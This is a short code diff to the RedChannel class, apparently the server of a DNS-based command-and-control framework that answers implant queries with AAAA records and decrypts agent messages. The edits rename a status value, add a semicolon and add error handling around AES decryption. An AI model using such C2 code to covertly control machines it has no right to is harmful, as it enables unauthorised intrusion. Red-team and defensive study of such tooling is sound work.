@@ -764,7 +764,7 @@ export default class RedChannel {
                 {
                     name: hostname,
                     type: C2AnswerType.TYPE_AAAA,
-                    data: this.makeIpString(implant.C2ResponseStatus.NO_DATA),
+                    data: this.makeIpString(implant.C2ResponseStatus.NOTHING_TO_DO),
                     ttl: Config.C2_ANSWER_TTL_SECS,
                 },
             ];
@@ -829,7 +829,7 @@ export default class RedChannel {
                     {
                         name: hostname,
                         type: C2AnswerType.TYPE_AAAA,
-                        data: this.makeIpString(implant.C2ResponseStatus.NO_DATA),
+                        data: this.makeIpString(implant.C2ResponseStatus.NOTHING_TO_DO),
                         ttl: Config.C2_ANSWER_TTL_SECS,
                     },
                 ];
@@ -918,7 +918,7 @@ export default class RedChannel {
                     ];
                 }
                 this.log.info(`agent(${agentId}) output>\n ${agentMessage}`);
-                agent.output.push(agentMessage)
+                agent.output.push(agentMessage);
                 this.agentOutputEmitter.emit(AgentOutputEvent.AGENT_OUTPUT, agentId, agentMessage);
                 break;
             }
@@ -985,7 +985,12 @@ export default class RedChannel {
         const ciphertext = dataBuffer.subarray(this.crypto.BLOCK_LENGTH);
 
         // may throw errors
-        const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
+        let plaintext: Buffer;
+        try {
+            plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
+        } catch (ex) {
+            throw new Error(`aes decrypt: ${emsg(ex)}`);
+        }
 
         try {
             const commandProto = implant.Command_Response.fromBinary(plaintext);
